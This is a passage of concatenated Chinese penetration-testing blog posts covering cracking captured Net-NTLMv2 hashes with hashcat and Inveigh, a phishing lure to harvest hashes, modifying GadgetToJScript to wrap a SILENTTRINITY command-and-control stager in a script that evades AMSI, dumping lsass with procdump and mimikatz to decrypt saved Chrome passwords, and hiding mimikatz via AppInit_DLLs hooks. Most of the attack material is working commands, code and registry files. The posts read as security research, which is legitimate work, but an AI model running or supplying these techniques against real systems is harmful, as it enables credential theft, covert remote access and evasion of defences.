<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 5600 a::192.168.62.139:c0b5429111f9c5f4:a5f1c47844e5b3b9c6f67736a2e1916d:0101000000000000669dae86ba8bd301a9134eee81ca25de0000000002001e00570049004e002d003100550041004200430047004200470049005500330001001e00570049004e002d003100550041004200430047004200470049005500330004001e00570049004e002d003100550041004200430047004200470049005500330003001e00570049004e002d003100550041004200430047004200470049005500330007000800669dae86ba8bd30106000400020000000800300030000000000000000000000000300000e9d9e613613097d1e2f47c1fd97fa099f65dfd78075d8bdb5ca162492ea5d2990a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00360032002e00310033003900000000000000000000000000 /tmp/password.list -o found.txt --force
</code></pre></div></div>

<p>说明：</p>

<p>-m： hash-type，5600对应NetNTLMv2，详细参数可查表：https://hashcat.net/wiki/doku.php?</p>

<p>-o： 输出文件
字典文件为/tmp/password.list</p>

<p>–force代表强制执行，测试系统不支持Intel OpenCL</p>

<p>成功破解出登录的明文密码，输出如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-11/2-8.png" alt="Alt text"></p>

<p>在渗透测试中，通常有以下两种利用方法</p>

<h4 id="1使用中间人攻击的方式来获取net-ntlm-hash常用工具为responder和inveigh">1、使用中间人攻击的方式来获取Net-NTLM hash，常用工具为Responder和Inveigh</h4>

<p>Responder:</p>

<p>python编写，可供参考的地址：</p>

<p>https://github.com/lgandx/Responder</p>

<p>Inveigh:</p>

<p>powershell编写，可供参考的地址：</p>

<p>https://github.com/Kevin-Robertson/Inveigh</p>

<p><strong>实际测试：</strong></p>

<p>测试环境同上，在同一网段下的一个测试主机运行Inveigh，参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\Inveigh.psd1
Invoke-Inveigh -consoleoutput Y
</code></pre></div></div>

<p>当客户端通过命令行远程连接服务器时，Inveigh捕获到Net-NTLMv2 hash，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-11/3-1.png" alt="Alt text"></p>

<p>NTLMv2 hash为<code class="language-plaintext highlighter-rouge">a::WIN-FVJLPTISCFE:A944CF357E0938DA:C1BB2CDD038D3AA6FA53FD360D7CBA9C:0101000000000000937115D1BC8BD301033605ACA1ACA1C00000000002001E00570049004E002D003100550041004200430047004200470049005500330001001E00570049004E002D003100550041004200430047004200470049005500330004001E00570049004E002D003100550041004200430047004200470049005500330003001E00570049004E002D003100550041004200430047004200470049005500330007000800937115D1BC8BD30106000400020000000800300030000000000000000100000000200000E9D9E613613097D1E2F47C1FD97FA099F65DFD78075D8BDB5CA162492EA5D2990A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00360032002E00310033003900000000000000000000000000</code></p>

<p>Hashcat参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 5600 a::WIN-FVJLPTISCFE:A944CF357E0938DA:C1BB2CDD038D3AA6FA53FD360D7CBA9C:0101000000000000937115D1BC8BD301033605ACA1ACA1C00000000002001E00570049004E002D003100550041004200430047004200470049005500330001001E00570049004E002D003100550041004200430047004200470049005500330004001E00570049004E002D003100550041004200430047004200470049005500330003001E00570049004E002D003100550041004200430047004200470049005500330007000800937115D1BC8BD30106000400020000000800300030000000000000000100000000200000E9D9E613613097D1E2F47C1FD97FA099F65DFD78075D8BDB5CA162492EA5D2990A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00360032002E00310033003900000000000000000000000000 /tmp/password.list --force
</code></pre></div></div>

<p>成功破解出登录的明文密码，输出如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-11/3-2.png" alt="Alt text"></p>

<h4 id="2通过多种方式强制目标客户端向伪造的服务器发起smb连接在伪造的服务器上捕获数据包获得net-ntlm-hash">2、通过多种方式强制目标客户端向伪造的服务器发起SMB连接，在伪造的服务器上捕获数据包，获得Net-NTLM hash</h4>

<p>对于SMB协议，客户端在连接服务端时，默认先使用本机的用户名和密码hash尝试登录</p>

<p><strong>实际测试：</strong></p>

<p>客户端IP： 192.168.62.139</p>

<p>服务端IP： 192.168.62.130</p>

<p>服务端运行Wireshark，捕获数据包</p>

<p>客服端尝试连接服务器，为便于演示，通过界面操作，地址栏直接输入<code class="language-plaintext highlighter-rouge">\\192.168.62.130</code>，弹框提示用户名密码不正确，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-11/4-1.png" alt="Alt text"></p>

<p>此时，服务端的Wireshark已经捕获到数据包，组装Net-NTLMv2 hash，内容如下：</p>

<p><code class="language-plaintext highlighter-rouge">a::WIN-FVJLPTISCFE:a05179df44d8cd35:43589a30aea29cf24fbd9c01a85e4b7e:0101000000000000eb8e1d9bf08ed301ca0ea89448cceba80000000002001e00570049004e002d003100550041004200430047004200470049005500330001001e00570049004e002d003100550041004200430047004200470049005500330004001e00570049004e002d003100550041004200430047004200470049005500330003001e00570049004e002d003100550041004200430047004200470049005500330007000800eb8e1d9bf08ed30106000400020000000800300030000000000000000100000000200000e4ab58611d3ed61427fa3c7075c75897aebae420dd42b71c73886ebca92b3c3b0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00360032002e00310033003900000000000000000000000000</code></p>

<p>Hashcat参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 5600 a::WIN-FVJLPTISCFE:a05179df44d8cd35:43589a30aea29cf24fbd9c01a85e4b7e:0101000000000000eb8e1d9bf08ed301ca0ea89448cceba80000000002001e00570049004e002d003100550041004200430047004200470049005500330001001e00570049004e002d003100550041004200430047004200470049005500330004001e00570049004e002d003100550041004200430047004200470049005500330003001e00570049004e002d003100550041004200430047004200470049005500330007000800eb8e1d9bf08ed30106000400020000000800300030000000000000000100000000200000e4ab58611d3ed61427fa3c7075c75897aebae420dd42b71c73886ebca92b3c3b0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00360032002e00310033003900000000000000000000000000 /tmp/password.list --force
</code></pre></div></div>

<p>成功破解出客户端当前用户的明文密码，输出如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-11/4-2.png" alt="Alt text"></p>

<p><strong>实际利用举例：</strong></p>

<p>发送钓鱼邮件，用户打开邮件时会隐蔽访问伪造的服务器，服务器通过捕获数据包就能获得目标当前用户的Net-NTLM hash，进一步破解还原出明文密码</p>

<h2 id="0x04-小结">0x04 小结</h2>
<hr>

<p>本文介绍了NTLM hash和Net-NTLM hash的区别，实际演示NTLM hash的加密方法和Net-NTLMv2 hash的破解方法。如果破解不出明文密码，对于NTLM hash可使用Pass-The-Hash作进一步利用，那么对于Net-NTLM hash呢？</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on January 11, 2018
  </div>

  
</article><article class="post">
  <h1>GadgetToJScript利用分析</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p><a href="https://github.com/med0x2e/GadgetToJScript">GadgetToJScrip</a>能够将.Net程序封装在js或vbs脚本中，相比于James Forshaw开源的<a href="https://github.com/tyranid/DotNetToJScript">DotNetToJScript</a>，修改了反序列化调用链，能够绕过AMSI，添加了绕过.Net 4.8+阻止Assembly.Load的功能</p>

<p>本文用来记录研究细节，分析利用思路，简要修改原工程，更便于测试Payload，分享同<a href="https://github.com/byt3bl33d3r/SILENTTRINITY">SILENTTRINITY</a>结合的方法</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>GadgetToJScript的代码分析和实现逻辑</li>
  <li>为了便于测试Payload的修改方法</li>
  <li>利用分析</li>
  <li>同SILENTTRINITY结合的方法</li>
</ul>

<h2 id="0x02-gadgettojscript的代码分析和实现逻辑">0x02 GadgetToJScript的代码分析和实现逻辑</h2>
<hr>

<h3 id="1代码分析">1.代码分析</h3>

<h4 id="1templates文件夹">(1)templates文件夹</h4>

<p>保存有js、vbs和hta的模板</p>

<p>模板文件同<a href="https://github.com/tyranid/DotNetToJScript/tree/69d1ddb146d23112127ac25decd27325dbfbef64/DotNetToJScript/Resources">DotNetToJScript</a>基本相同，区别如下：</p>

<ol>
  <li>添加了一些对.Net版本的判断，读取注册表<code class="language-plaintext highlighter-rouge">HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\</code>，如果成功，版本为4.0.30319，否则为2.0.50727</li>
  <li>做了两次反序列化，第一次是禁用ActivitySurrogateSelector类型检查，用来绕过.Net 4.8+阻止Assembly.Load的功能，第二次用来加载.Net程序</li>
</ol>

<h4 id="2programcs">(2)Program.cs</h4>

<p>主程序，替换模板中的变量，计算长度，生成最终的js、vbs和hta脚本</p>

<h4 id="3testassemblyloadercs">(3)TestAssemblyLoader.cs</h4>

<p>Payload以字符串的形式保存，使用CompileAssemblyFromSource对其进行动态编译，编译结果保存在内存(results.CompiledAssembly)中</p>

<p>关键函数：<code class="language-plaintext highlighter-rouge">CompileAssemblyFromSource</code></p>

<p>其中，GenerateInMemory属性默认为true，表示把编译生成的程序集保留在内存中，通过CompilerResults实例的CompiledAssembly可以获取，如果设置为false，可以将编译生成的程序集保存在本地硬盘</p>

<p>参考资料：</p>

<p>https://docs.microsoft.com/en-us/dotnet/api/system.codedom.compiler.codedomprovider.compileassemblyfromsource?view=netframework-4.8</p>

<h4 id="4_asurrogategadgetgeneratorcs">(4)_ASurrogateGadgetGenerator.cs</h4>

<p>构建一个链来映射字节数组以创建类的实例:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>byte[] -&gt; Assembly.Load -&gt; Assembly -&gt; Assembly.GetType -&gt; Type[] -&gt; Activator.CreateInstance -&gt; Win!
</code></pre></div></div>

<p>该段代码应该来自于：https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/ActivitySurrogateSelectorGenerator.cs#L50</p>

<p>可以理解为TestAssemblyLoader.cs实现将编译结果保存在内存(results.CompiledAssembly)中，_ASurrogateGadgetGenerator.cs用来读取这段内存并实现对.Net程序的调用</p>

<h4 id="5_disabletypecheckgadgetgeneratorcs">(5)_DisableTypeCheckGadgetGenerator.cs</h4>

<p>用来绕过.Net 4.8+阻止Assembly.Load的功能</p>

<p>详细细节可参考：</p>

<p>https://silentbreaksecurity.com/re-animating-activitysurrogateselector/</p>

<h4 id="6_surrogateselectorcs">(6)_SurrogateSelector.cs</h4>

<p>创建Surrogate类，该类充当包装器</p>

<p>该段代码应该来自于：https://github.com/pwntester/ysoserial.net/blob/bb695b8162bdc1d191c32f6a234a8fff5665ab9b/ysoserial/Generators/ActivitySurrogateSelectorGenerator.cs#L15</p>

<h3 id="2实现逻辑">2.实现逻辑</h3>

<ol>
  <li>执行TestAssemblyLoader.cs，将字符串形式的Payload进行动态编译，编译结果保存在内存(results.CompiledAssembly)中</li>
  <li>执行_ASurrogateGadgetGenerator.cs，读取1中的内存并实现.Net程序的调用</li>
  <li>执行_DisableTypeCheckGadgetGenerator.cs，实现绕过.Net 4.8+阻止Assembly.Load的功能</li>
  <li>执行Program.cs，替换模板文件的两个变量，计算长度，生成最终的js、vbs和hta脚本</li>
</ol>

<h2 id="0x03-为了便于测试payload的修改方法">0x03 为了便于测试Payload的修改方法</h2>
<hr>

<p>查看文件TestAssemblyLoader.cs，Payload以字符串的形式进行保存，部分内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           string _testClass = @"
                    
                using System;
                using System.Runtime.InteropServices;
                    public class TestClass
                    {
                        " + "[DllImport(\"User32.dll\", CharSet = CharSet.Unicode)]" +
                        @"public static extern int MessageBox(IntPtr h, string m, string c, int t);
                        public TestClass(){
                            " + "MessageBox((IntPtr)0, \"Test .NET Assembly Constructor Called.\", \"Coolio\", 0);" +
                        @"}
                    }           
            ";
</code></pre></div></div>

<p>我们可以看到，Payload以字符串的形式进行保存时，需要考虑转义字符，这会影响Payload的开发效率，也不是很直观</p>

<p>这里给出我的一个解决方法：将<code class="language-plaintext highlighter-rouge">CompileAssemblyFromSource</code>换成<code class="language-plaintext highlighter-rouge">CompileAssemblyFromFile</code></p>

<p>这样可以从文件中读取Payload，也就不再需要考虑转义字符</p>

<p>我修改过的版本已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/GadgetToJScript</p>

<p>我的版本修改了TestAssemblyLoader.cs，关键代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CompilerResults results = provider.CompileAssemblyFromFile(parameters, "payload.txt");
</code></pre></div></div>

<p>从固定文件payload.txt中读取Payload</p>

<p>如果想要实现同原工程相同的功能，payload.txt的内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
using System.Runtime.InteropServices;
public class TestClass
{
	[DllImport("User32.dll", CharSet = CharSet.Unicode)]public static extern int MessageBox(IntPtr h, string m, string c, int t);
	public TestClass()
	{
		MessageBox((IntPtr)0, "Test .NET Assembly Constructor Called.", "Coolio", 0);
        }
}
</code></pre></div></div>

<p>Payload看起来更加直观，也更易于开发</p>

<h2 id="0x04-利用分析">0x04 利用分析</h2>
<hr>

<p>GadgetToJScript应该算是对James Forshaw开源的DotNetToJScript的进一步利用，添加的反序列化调用链不需要调用<code class="language-plaintext highlighter-rouge">d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)</code>，能够绕过一些杀毒软件对特定代码的检测，可尝试以此为模板做进一步的开发</p>

<p>对于Payload的进一步利用，需要更换成csharp的格式，这让我想到了SILENTTRINITY</p>

<h2 id="0x05-同silenttrinity结合的方法">0x05 同SILENTTRINITY结合的方法</h2>
<hr>

<p>对于SILENTTRINITY，我在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/SILENTTRINITY%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">《SILENTTRINITY利用分析》</a>做过分析</p>

<p><strong>注：</strong></p>

<p>SILENTTRINITY正在持续更新中，添加了更多功能，我文章的内容有可能不再准确</p>

<p>搭建好SILENTTRINITY后，选择生成csharp格式的stager，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stagers
list
use csharp
generate http
</code></pre></div></div>

<p>提取stager.cs中的代码，填入payload.txt，最终示例代码已上传至github，地址如下：https://github.com/3gstudent/GadgetToJScript/blob/master/payload.txt</p>

<p>编译我修改过的GadgetToJScript，将payload.txt保存在同级目录，生成js脚本的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GadgetToJScript.exe -w js -o 1
</code></pre></div></div>

<p>生成1.js</p>

<p>执行1.js后，SILENTTRINITY获得上线信息，进程名称为wscript，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-10-10/2-1.png" alt="Alt text"></p>

<p>测试成功</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了GadgetToJScript的代码细节和实现流程，简要修改原工程，更便于测试Payload，分析利用思路，分享同<a href="https://github.com/byt3bl33d3r/SILENTTRINITY">SILENTTRINITY</a>结合的方法</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on October 10, 2019
  </div>

  
</article><article class="post">
  <h1>渗透技巧——利用Masterkey离线导出Chrome浏览器中保存的密码</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">《渗透技巧——离线导出Chrome浏览器中保存的密码》</a>曾得出结论：<code class="language-plaintext highlighter-rouge">使用用户的ntlm hash，无法导出Chrome浏览器保存的明文密码</code>。</p>

<p>而目前的Windows系统(如Windows Server 2012)，默认无法导出用户的明文口令，只能获得ntlm hash。</p>

<p>也就是说，即使获得了系统的访问权限，如果无法获得明文口令，通过文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">《渗透技巧——离线导出Chrome浏览器中保存的密码》</a>介绍的方法还是无法离线(但可以在线)导出Chrome浏览器保存的明文密码。</p>

<p>本文将要介绍一种新方法，利用Masterkey离线导出Chrome浏览器中保存的密码，不需要获得用户的明文口令，并且得出新的结论。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>基础概念</li>
  <li>解密思路</li>
  <li>导出方法</li>
  <li>实际测试</li>
</ul>

<h2 id="0x02-基础概念">0x02 基础概念</h2>
<hr>

<h4 id="dpapi">DPAPI：</h4>

<p>全称Data Protection Application Programming Interface</p>

<h4 id="dpapi-blob">DPAPI blob：</h4>

<p>一段密文，可使用Master Key对其解密</p>

<h4 id="master-key">Master Key：</h4>

<p>64字节，用于解密DPAPI blob，使用用户登录密码、SID和16字节随机数加密后保存在Master Key file中</p>

<h4 id="master-key-file">Master Key file：</h4>

<p>二进制文件，可使用用户登录密码对其解密，获得Master Key</p>

<h2 id="0x03-dpapi解密思路">0x03 DPAPI解密思路</h2>
<hr>

<h3 id="1定位加密的master-key-file">1、定位加密的Master Key file</h3>

<p>文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">《渗透技巧——离线导出Chrome浏览器中保存的密码》</a>曾得出结论：<code class="language-plaintext highlighter-rouge">无法定位解密Chrome数据库对应的Master Key file</code></p>

<p>该结论有误，实际上能够对其定位，方法见0x04</p>

<h3 id="2从lsass进程提取出master-key">2、从lsass进程提取出Master Key</h3>

<p>此处换了一种思路，因此不需要用户的明文口令</p>

<p><strong>注：</strong></p>

<p>离线从Master Key file提取出Master Key，必须要获得用户的明文口令</p>

<h3 id="3使用master-key解密dpapi-blob获得明文">3、使用Master Key解密DPAPI blob，获得明文</h3>

<h2 id="0x04-实现方法">0x04 实现方法</h2>
<hr>

<p>测试系统：</p>

<p>Win7 x86</p>

<h3 id="1使用python读取数据库文件并提取出密文">1、使用python读取数据库文件并提取出密文</h3>

<p>使用python脚本读取Login Data并保存到文件中，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from os import getenv
import sqlite3
import binascii
conn = sqlite3.connect("Login Data")
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
    print (binascii.b2a_hex(result[2]))
    f = open('test.txt', 'wb')
    f.write(result[2])
    f.close()
</code></pre></div></div>

<p>脚本执行后，提取Login Data中保存的密文，保存为test.txt</p>

<h3 id="2获得该密文对应的master-key-file">2、获得该密文对应的Master Key file</h3>

<p>mimikatz命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dpapi::blob /in:test.txt
</code></pre></div></div>

<p>获得对应guidMasterkey为<code class="language-plaintext highlighter-rouge">{a111b0f6-b4d7-40c8-b536-672a8288b958}</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-14/2-1.png" alt="Alt text"></p>

<p>即Master Key file的路径为<code class="language-plaintext highlighter-rouge">%APPDATA%\Microsoft\Protect\%SID%\a111b0f6-b4d7-40c8-b536-672a8288b958</code></p>

<h3 id="3从lsass进程提取出master-key">3、从lsass进程提取出Master Key</h3>

<h4 id="1-在线方式">(1) 在线方式</h4>

<p>需要管理员权限</p>

<p>mimikatz:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>privilege::debug
sekurlsa::dpapi
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-14/2-2.png" alt="Alt text"></p>

<p>提取出Master Key为<code class="language-plaintext highlighter-rouge">666638cbaea3b7cf1dc55688f939e50ea1002cded954a1d17d5fe0fbc90b7dd34677ac148af1f32caf828fdf7234bafbe14b39791b3d7e587176576d39c3fa70</code></p>

<h4 id="2-离线方式">(2) 离线方式</h4>

<p>使用procdump dump出LSASS进程内存</p>

<p>procdump下载地址：</p>

<p>https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</p>

<p>管理员权限：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp
</code></pre></div></div>

<p>使用mimikatz加载dmp文件：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sekurlsa::minidump lsass.dmp
sekurlsa::dpapi
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>mimikatz从lsass进程提取出Master Key后，会自动将Master Key加入系统缓存</p>

<h3 id="4使用masterkey解密">4、使用masterkey解密</h3>

<p>mimikatz:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dpapi::blob /in test.txt
</code></pre></div></div>

<p>成功获得明文，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-14/2-3.png" alt="Alt text"></p>

<p>数据正确，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-14/2-4.png" alt="Alt text"></p>

<h2 id="0x05-利用分析">0x05 利用分析</h2>
<hr>

<p>本文介绍的方法是利用lsass进程还原出Master Key，因此不需要获取到用户的明文密码</p>

<p>同时，配合procdump，不需要在测试系统上执行mimikatz，只需要获得目标系统的两个文件：lsass进程的dmp文件和Login Data文件，在本地使用mimikatz还原出Master Key，解密获得明文</p>

<p>并且，不需要从System权限降权到当前用户权限</p>

<p>综上，离线导出的完整思路如下：</p>

<h4 id="1获得用户系统chrome保存密码的sqlite数据库文件位于localappdatagooglechromeuser-datadefaultlogin-data">1、获得用户系统Chrome保存密码的SQLite数据库文件，位于<code class="language-plaintext highlighter-rouge">%LocalAppData%\Google\Chrome\User Data\Default\Login Data</code></h4>

<h4 id="2获得lsass进程的内存文件">2、获得lsass进程的内存文件</h4>

<h4 id="3在本地使用mimikatz提取master-key解密login-data获得明文">3、在本地使用mimikatz提取Master Key，解密Login Data获得明文</h4>

<h2 id="0x06-最终结论">0x06 最终结论</h2>
<hr>

<h3 id="1能够定位master-key-file">1、能够定位Master Key file</h3>

<p>方法1:</p>

<p>mimikatz命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dpapi::blob /in:test.txt
</code></pre></div></div>

<p>方法2：</p>

<p>通过读取文件Preferred的前16字节获得对应的Master Key file</p>

<h3 id="2不需要用户明文口令也能离线导出chrome浏览器中保存的密码">2、不需要用户明文口令也能离线导出Chrome浏览器中保存的密码</h3>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文介绍了如何利用Masterkey离线导出Chrome浏览器中保存的密码，相比于之前的方法，更加通用</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on February 14, 2018
  </div>

  
</article><article class="post">
  <h1>利用globalAPIhooks在Win7系统下隐藏进程</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Powershell-tricks-Hide-Process-by-kd.exe/">《Powershell tricks::Hide Process by kd.exe》</a>介绍过通过kd.exe隐藏进程的技巧，最大的缺点是需要开启Local kernel debugging模式，等待重启才能生效
这次介绍另外一个隐藏进程的方法——利用global API hooks
优点是即时生效，不需要等待系统重启</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要参照Sergey Podobry的文章，对该方法进行介绍，分析实际测试中需要注意的细节，并补全在64位下具体的参数设置</p>

<p><strong>参考链接：</strong></p>

<p>https://www.codeproject.com/articles/49319/easy-way-to-set-up-global-api-hooks?display=print</p>

<p>https://github.com/subTee/AppInitGlobalHooks-Mimikatz</p>

<h2 id="0x02-原理">0x02 原理</h2>
<hr>

<p>在用户层，通过global API hooks将测试dll注入到系统的所有进程，实现对指定进程的隐藏</p>

<h3 id="hook方式">hook方式</h3>

<p>修改注册表键值AppInit_DLLs</p>

<p><strong>位置：</strong></p>

<p><code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows</code></p>

<p><strong>参数说明：</strong></p>

<p><strong>LoadAppInit_DLLs:</strong></p>

<p>(REG_DWORD)	Value that globally enables or disables AppInit_DLLs.</p>
<ul>
  <li>0x0 – AppInit_DLLs are disabled.</li>
  <li>0x1 – AppInit_DLLs are enabled.</li>
</ul>

<p><strong>AppInit_DLLs:</strong></p>

<p>(REG_SZ)
Space - or comma -separated list of DLLs to load. The complete path to the DLL should be specified using short file names.	C:\PROGRA~1\Test\Test.dll</p>

<p><strong>RequireSignedAppInit_DLLs:</strong></p>

<p>(REG_DWORD)	Require code-signed DLLs.</p>

<ul>
  <li>0x0 – Load any DLLs.</li>
  <li>0x1 – Load only code-signed DLLs.</li>
</ul>

<h3 id="代码实现">代码实现</h3>

<p>通过Mhook library实现API hooking</p>

<p><strong>优点：</strong></p>

<ul>
  <li>开源</li>
  <li>支持x86和x64</li>
  <li>使用简便</li>
</ul>

<p><strong>参考地址：</strong></p>

<p>http://codefromthe70s.org/mhook22.aspx</p>

<h2 id="0x03-实际测试">0x03 实际测试</h2>
<hr>

<p><strong>测试环境：</strong></p>

<p>Win7x86</p>

<h3 id="1设置注册表键值appinit_dlls">1.设置注册表键值AppInit_DLLs</h3>

<p><strong>参照代码：</strong></p>

<p>https://github.com/subTee/AppInitGlobalHooks-Mimikatz/blob/master/AppInit.reg</p>

<p>.reg文件如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows]
"AppInit_DLLs"="C:\\Tools\\AppInitHookx64.dll,C:\\Tools\\AppInitHook.dll"
"LoadAppInit_DLLs"=dword:00000001
"RequireSignedAppInit_DLLs"=dword:00000000
</code></pre></div></div>

<p>表示</p>

<ul>
  <li>AppInit_DLLs are enabled</li>
  <li>Load any DLLs，do not need code-signed DLLs</li>
  <li>DLL path：C:\Tools\AppInitHookx64.dll,C:\Tools\AppInitHook.dll</li>
</ul>

<p><strong>注：</strong></p>

<p>设置的路径不能存在空格，否则失效</p>

<h3 id="2编译生成appinithookdll并放在ctools下">2.编译生成AppInitHook.dll并放在C:\Tools下</h3>

<p>参照工程：</p>

<p>https://github.com/subTee/AppInitGlobalHooks-Mimikatz</p>

<h3 id="3运行mimikatzexe">3.运行mimikatz.exe</h3>

<p>任务管理器进程列表不存在mimikatz.exe</p>

<p>Process Explorer不存在mimikatz.exe</p>

<p>Tasklist.exe不存在mimikatz.exe</p>

<p><strong>注：</strong></p>

<p>此处没有完全隐藏进程，是将进程名设置为conhost.exe，这是因为mimikatz是控制台应用程序</p>

<p>如果换成putty.exe或calc.exe这种Win32项目，则不存在这个问题，能够完全隐藏进程</p>

<p>使用Process Explorer查看新建的进程，均加载了AppInitHook.dll，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-11/2-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>管理员权限运行Process Explorer，可查看高权限进程加载的dll</p>

<h3 id="4win7x64测试">4.Win7x64测试</h3>

<p>64位系统同32位系统的区别在注册表也有所体现</p>

<p><strong>注：</strong></p>

<p>详情可参考之前的文章《关于32位程序在64位系统下运行中需要注意的重定向问题》</p>

<p>64位程序对应注册表位置：</p>

<p><code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\</code></p>

<p>32位程序对应注册表位置：</p>

<p><code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\</code></p>

<p>所以，如果要hook 64位系统下的所有进程(32位和64位)，需要修改两处注册表键值</p>

<p>64位的注册表键值位置：</p>

<p><code class="language-plaintext highlighter-rouge">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Windows]</code></p>

<p>32位的注册表键值位置：</p>

<p><code class="language-plaintext highlighter-rouge">[HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows]</code></p>

<p>具体修改代码已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/AppInitGlobalHooks-Mimikatz/blob/master/AppInit64.reg</p>

<p>修改后使用Process Explorer查看如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-11/2-2.png" alt="Alt text"></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-11/2-3.png" alt="Alt text"></p>

